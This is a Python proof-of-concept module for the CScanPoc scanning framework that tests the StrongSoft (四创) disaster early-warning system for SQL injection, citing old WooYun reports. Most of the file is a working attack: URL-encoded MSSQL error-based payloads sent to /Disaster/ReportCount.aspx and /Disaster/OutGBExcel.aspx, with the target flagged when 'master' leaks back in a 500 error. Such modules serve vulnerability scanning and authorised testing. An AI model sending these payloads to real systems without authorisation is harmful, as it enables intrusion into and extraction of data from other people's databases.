# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0001'  # 平台漏洞编号，留空
    name = '四创灾害预警系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-12'  # 漏洞公布时间
    desc = '''
        四创灾害预警系统
        /Disaster/ReportCount.aspx
        /Disaster/OutGBExcel.aspx
        存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=091242、091284'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8c9b3778-97d6-4b23-a539-68b7788880db'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-091242
            # http://www.wooyun.org/bugs/wooyun-2010-091284
            payload1 = '/Disaster/ReportCount.aspx?tabnm=1'
            payload2 = '/Disaster/OutGBExcel.aspx?tabnm=a&qtype=b&queryvalue=1'
            getdata1 = '%27%2b(select+1+where+1=convert(int,db_name(1)))%2b%27'
            getdata2 = "%27%2b(select+db_name(1))%2b%27"
            verify_url1 = self.target + payload1 + getdata1
            verify_url2 = self.target + payload2 + getdata2

            req1 = requests.get(verify_url1)
            if req1.status_code == 500 and 'master' in req1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            req2 = requests.get(verify_url2)
            if req2.status_code == 500 and 'master' in req2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
